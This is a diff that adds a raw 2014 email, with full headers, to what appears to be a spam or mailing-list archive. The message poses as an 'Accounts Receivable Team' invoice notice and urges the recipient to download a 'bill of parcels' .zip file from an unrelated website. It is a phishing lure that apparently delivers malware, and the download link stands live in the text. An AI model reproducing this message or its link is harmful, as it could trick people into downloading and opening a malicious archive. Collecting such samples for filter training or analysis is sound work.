@@ -1,0 +1,34 @@
+Delivered-To: lists-linux-kernel@bruce-guenter.dyndns.org
+Received: (qmail 23021 invoked from network); 22 Jan 2014 20:02:24 -0000
+Received: from localhost (localhost [127.0.0.1])
+  by bruce-guenter.dyndns.org ([192.168.1.2]); 22 Jan 2014 20:02:24 -0000
+Received: from zak.futurequest.net ([127.0.0.1])
+  by localhost ([127.0.0.1])
+  with SMTP via TCP; 22 Jan 2014 20:02:24 -0000
+Received: (qmail 11891 invoked from network); 22 Jan 2014 20:02:23 -0000
+Received: from host-89-242-51-209.as13285.net ([92.19.120.25])
+  by zak.futurequest.net ([69.5.6.152])
+  with ESMTP via TCP; 22 Jan 2014 20:02:23 -0000
+Received: from 10.0.0.28 ([10.0.0.28])
+Message-ID: <DDE8288D1AE34BEC8E54FEDAB1DFDAD3@todder-245>
+From: "Accounts Receivable Team" <uri@fragilefilms.com>
+To: "Customer" <lists-linux-kernel@bruce-guenter.dyndns.org>
+Subject: Processing of order
+Date: Wed, 22-Jan-2014 20:02:23 GMT
+MIME-Version: 1.0
+Content-Type: text/plain;
+	format=flowed;
+	charset="windows-1252";
+	reply-type=original
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Windows Live Mail 14.0.8089.726
+X-MimeOLE: Produced By Microsoft MimeOLE V14.0.8089.726
+
+Hello, Customer
+This is a notification that an bill of parcels has been generated on 21/01/14. Your payment method is: wire transfer.
+You can find the bill of parcels here:
+http://mradio.spsjm.sk/2014/bills/bl456-254-409.zip
+Good-bye
+Accounts Receivable Team
